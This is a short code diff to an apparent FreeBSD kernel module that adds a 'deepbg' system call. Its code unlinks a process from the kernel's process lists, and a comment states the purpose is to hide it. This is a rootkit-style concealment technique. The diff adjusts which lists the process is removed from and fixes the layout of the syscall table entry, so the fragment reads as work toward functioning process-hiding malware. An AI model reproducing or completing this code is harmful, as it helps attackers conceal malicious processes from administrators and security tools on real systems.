@@ -84,7 +84,6 @@ static int deepbg(struct thread *td, void *syscall_args)
 
             /* Remove the process from p_list, p_sibling, and p_hash lists to hide it */
             LIST_REMOVE(p, p_list);
-            LIST_REMOVE(p, p_sibling);
             LIST_REMOVE(p, p_hash);
 
             /*
@@ -112,9 +111,8 @@ static int deepbg(struct thread *td, void *syscall_args)
 
 /* The sysent for the new system call. */
 static struct sysent deepbg_sysent = {
-   deepbg,         // implementing function
-   NULL,
    1,              // number of arguments
+   deepbg          // implementing function
 };
 
 /* The offset in sysent[] where the system call is to be allocated. */
